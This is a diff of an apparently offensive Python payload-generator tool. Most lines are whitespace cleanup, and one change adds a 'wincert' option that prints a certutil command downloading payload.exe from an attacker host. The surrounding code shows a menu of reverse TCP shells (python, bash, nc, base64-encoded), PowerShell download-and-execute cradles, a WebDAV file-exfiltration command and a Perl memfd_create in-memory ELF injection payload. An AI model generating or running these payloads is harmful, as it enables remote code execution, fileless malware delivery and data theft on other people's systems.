@@ -165,14 +165,14 @@ def create_perl_mem_payload(type):
     payload_file = '%s_payload' % type
     perl_payload_file = '%s_payload.pl' % type
 
-    payload = '''#!/usr/bin/env perl 
+    payload = '''#!/usr/bin/env perl
 use warnings;
 use strict;
 $|=1;
 my $name = "";
 my $fd = syscall(319, $name, 1);
 if (-1 == $fd) {
-   die "memfd_create: $!"; 
+   die "memfd_create: $!";
 }
 print "fd $fd\\n";
 open(my $FH, '>&='.$fd) or die "open: $!";
@@ -261,7 +261,7 @@ func main() {
 
 	child, err := gexpect.Spawn("mysql -u %s -p%s")''' % (username, password)
     payload += '''
-    
+
 	if err != nil {
 		panic(err)
 	}
@@ -311,22 +311,23 @@ Simplifies payload creation and listener.
     lin64    <LHOST> <LPORT>  |   x64 Linux payload
     lin32    <LHOST> <LPORT>  |   x32 Linux payload
     mysql64  <LHOST> <LPORT>  |   x64 Linux mysql payload
-                              | 
+                              |
   <~~~~~~~~~~~~~~~~~~~~~~~[Payloads CLI]~~~~~~~~~~~~~~~~~~~~~~~~~~>
                               |
     python   <LHOST> <LPORT>  |   python reverse_tcp payload
     python2  <LHOST> <LPORT>  |   python2 reverse_tcp payload
-    python3  <LHOST> <LPORT>  |   python3 reverse_tcp payload    
+    python3  <LHOST> <LPORT>  |   python3 reverse_tcp payload
     bash     <LHOST> <LPORT>  |   bash reverse_tcp payload
     ncbash   <LHOST> <LPORT>  |   nc bash combined reverse_tcp payload
     b64py    <LHOST> <LPORT>  |   base64 encoded python payload
     b64py2   <LHOST> <LPORT>  |   base64 encoded python2 payload
     b64py3   <LHOST> <LPORT>  |   base64 encoded python3 payload
     nc       <LHOST> <LPORT>  |   np reverse_tcp payload
-  <~~~~~~~~~~~~~~~~~~~~~~~[Win Payloads CLI]~~~~~~~~~~~~~~~~~~~~~~~>             
+  <~~~~~~~~~~~~~~~~~~~~~~~[Win Payloads CLI]~~~~~~~~~~~~~~~~~~~~~~~>
                               |
-    winhttp  <LHOST> <LPORT>  |    windows download and execute  
+    winhttp  <LHOST> <LPORT>  |    windows download and execute
     windl    <LHOST> <LPORT>  |    windows download file
+    wincert  <LHOST> <LPORT>  |    windows download file with certutil
     winup    <LHOST> <LPORT>  |    windows webdav file upload
                               |
   <~~~~~~~~~~~~~~~~~~~~~~~[Listen]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
@@ -340,12 +341,12 @@ Simplifies payload creation and listener.
                               |
   <~~~~~~~~~~~~~~~~~~~~~~~[Advanced]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
                               |
-    mperl64  <LHOST> <LPORT>  |   x64 Linux elf memory inject binary                                               
+    mperl64  <LHOST> <LPORT>  |   x64 Linux elf memory inject binary
     mperl32  <LHOST> <LPORT>  |   x32 Linux elf memory inject binary
                               |
   <~~~~~~~~~~~~~~~~~~~~~~~~[Misc]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
                               |
-    httpsrv  <HOST>  <PORT>   |  Http server listen in current dir     
+    httpsrv  <HOST>  <PORT>   |  Http server listen in current dir
                               |
   <~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
 
@@ -381,28 +382,35 @@ if __name__ == '__main__':
             sys.exit(0)
 
         os.system("python -m http.server --bind %s %s" % (lhost, lport))
-        sys.exit(0)       
+        sys.exit(0)
 
     if type == 'winhttp':
         _payload = '''powershell "IEX(New-Object Net.WebClient).downloadString('http://%s:%s/shell.ps1')"''' % (lhost, lport)
         print('')
         print(_payload)
         print('')
-        sys.exit(0)        
+        sys.exit(0)
 
     if type == 'windl':
         _payload = '''powershell -command "& { iwr http://%s:%s/shell.ps1 -OutFile shell.ps1 }"''' % (lhost, lport)
         print('')
         print(_payload)
         print('')
-        sys.exit(0)        
+        sys.exit(0)
+
+    if type == 'wincert':
+        _payload = '''certutil.exe -urlcache -split -f http://%s:%s/payload.exe''' % (lhost, lport)
+        print('')
+        print(_payload)
+        print('')
+        sys.exit(0)
 
     if type == 'winup':
         _payload = '''powershell "$WebClient = New-Object System.Net.WebClient;$WebClient.UploadFile('http://%s:%s/filename', 'PUT', 'c:\\filename')"''' % (lhost, lport)
         print('')
         print(_payload)
         print('')
-        sys.exit(0)       
+        sys.exit(0)
 
 
     if type == 'python':
